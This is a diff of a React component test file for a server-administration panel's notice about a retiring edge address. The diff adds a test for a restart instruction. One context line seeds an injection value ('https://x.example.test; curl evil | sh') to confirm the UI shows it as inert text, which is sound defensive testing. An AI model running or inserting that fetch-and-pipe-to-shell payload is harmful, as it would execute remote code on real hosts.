@@ -195,6 +195,16 @@ describe('a retiring or retired edge address', () => {
     expect(caution.compareDocumentPosition(callout.getByText(`sudo cloudfield-server edge move ${replacement}`)) & Node.DOCUMENT_POSITION_FOLLOWING).toBeTruthy()
   })
 
+  it('says to restart once the options file names the new address', () => {
+    seed('super_admin', { ...claimed, notice: { state: 'retiring', replacement, moved_to: replacement } })
+    render(<RemoteAccessSection client={api()} />)
+    const callout = within(screen.getByRole('status'))
+    expect(callout.getByText(`The server's options file already names ${replacement}; the server still runs at ${edgeURL}. Restart it on the server's host to apply:`)).toBeTruthy()
+    expect(callout.getByText('sudo systemctl restart aether-server')).toBeTruthy()
+    expect(callout.queryByText(/edge move/)).toBeNull()
+    expect(callout.queryByText(/Move the server/)).toBeNull()
+  })
+
   it('shows a replacement that is not a bare https origin as text, with no command', () => {
     seed('super_admin', { ...claimed, notice: { state: 'retiring', replacement: 'https://x.example.test; curl evil | sh' } })
     render(<RemoteAccessSection client={api()} />)
